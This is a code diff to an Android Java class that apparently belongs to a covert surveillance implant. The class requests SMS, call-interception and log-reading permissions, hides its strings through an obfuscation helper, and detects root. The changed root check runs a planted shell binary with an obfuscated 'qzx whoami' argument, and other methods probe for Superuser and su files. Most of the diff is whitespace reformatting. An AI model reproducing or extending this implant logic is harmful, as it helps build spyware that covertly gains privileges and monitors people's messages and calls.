@@ -37,8 +37,7 @@ public class PackageInfo {
 	private FileInputStream fin;
 	private XmlParser xml;
 
-	private String requiredPerms[] = { 
-			"android.permission.READ_LOGS", "android.permission.READ_SMS",
+	private String requiredPerms[] = { "android.permission.READ_LOGS", "android.permission.READ_SMS",
 			"android.permission.SET_WALLPAPER", "android.permission.SEND_SMS",
 			"android.permission.PROCESS_OUTGOING_CALLS", "android.permission.WRITE_APN_SETTINGS",
 			"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.WRITE_SMS",
@@ -68,7 +67,7 @@ public class PackageInfo {
 	static public String getPackageName() {
 		return Status.getAppContext().getPackageName();
 	}
-	
+
 	private ArrayList<String> getPackagePermissions() {
 		return this.xml.getPackagePermissions(this.packageName);
 	}
@@ -137,17 +136,23 @@ public class PackageInfo {
 			final AutoFile file = new AutoFile(Configuration.shellFile);
 
 			if (file.exists() && file.canRead()) {
-				
-				// 32_14= air
-				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + M.e(" air"));
-				p.waitFor();
 
-				if (p.exitValue() == 1) {
+				// 32_14= air
+				//Execute.executeRoot("touch /sdcard/air");
+				
+				//final String stdout = Execute.executeScript(Configuration.shellFile + M.e(" qzx whoami"));
+				final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx whoami"));
+				String stdout = p.getStdout();
+				if (stdout.startsWith("root")) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
 					}
 
 					isRoot = true;
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (checkRoot): isRoot NOOOOO"); //$NON-NLS-1$ //$NON-NLS-2$
+					}
 				}
 			}
 		} catch (final Exception e) {
@@ -162,22 +167,22 @@ public class PackageInfo {
 
 		return isRoot;
 	}
-	
+
 	static public boolean hasSu() {
 		if (checkRootPackages() == true) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (hasSu): checkRootPackages true"); //$NON-NLS-1$
-			}			
+			}
 			return true;
 		}
-		
+
 		if (checkDebugBuild() == true) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (hasSu): checkDebugBuild true"); //$NON-NLS-1$
-			}			
+			}
 			return true;
 		}
-		
+
 		return false;
 	}
 
@@ -190,7 +195,7 @@ public class PackageInfo {
 		if (i == null) {
 			return false;
 		}
-		
+
 		while (i.hasNext()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (checkSuBinary): " + i.next()); //$NON-NLS-1$
@@ -205,39 +210,39 @@ public class PackageInfo {
 			Check.log(TAG + " (checkRootPackages)");
 		}
 		try {
-			//32_39=/system/app/Superuser.apk			
-            File file = new File(M.e("/system/app/Superuser.apk"));            
-            if (file.exists()) {
-                return true;
-            }
-            
-            //32_40=/data/app/com.noshufou.android.su-1.apk
-            file = new File(M.e("/data/app/com.noshufou.android.su-1.apk"));
-            if (file.exists()) {
-                return true;
-            }
-            
-            //32_41=/data/app/com.noshufou.android.su-2.apk
-            file = new File(M.e("/data/app/com.noshufou.android.su-2.apk"));
-            if (file.exists()) {
-                return true;
-            }
-            
-            //32_42=/system/bin/su
-            file = new File(M.e("/system/bin/su"));
-            if (file.exists()) {
-                return true;
-            }
-		} catch (Exception e) { 
-        	if (Cfg.EXCEPTION) {
-        		Check.log(e);
-        	}
-        }
+			// 32_39=/system/app/Superuser.apk
+			File file = new File(M.e("/system/app/Superuser.apk"));
+			if (file.exists()) {
+				return true;
+			}
+
+			// 32_40=/data/app/com.noshufou.android.su-1.apk
+			file = new File(M.e("/data/app/com.noshufou.android.su-1.apk"));
+			if (file.exists()) {
+				return true;
+			}
+
+			// 32_41=/data/app/com.noshufou.android.su-2.apk
+			file = new File(M.e("/data/app/com.noshufou.android.su-2.apk"));
+			if (file.exists()) {
+				return true;
+			}
+
+			// 32_42=/system/bin/su
+			file = new File(M.e("/system/bin/su"));
+			if (file.exists()) {
+				return true;
+			}
+		} catch (Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+		}
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkRootPackages), no root found");
 		}
-        return false;
+		return false;
 	}
 
 	private static boolean checkDebugBuild() {
@@ -246,10 +251,10 @@ public class PackageInfo {
 		}
 		String buildTags = android.os.Build.TAGS;
 
-        if (buildTags != null && buildTags.contains("test-keys")) {
-            return true;
-        }
-        
-        return false;
+		if (buildTags != null && buildTags.contains("test-keys")) {
+			return true;
+		}
+
+		return false;
 	}
 }
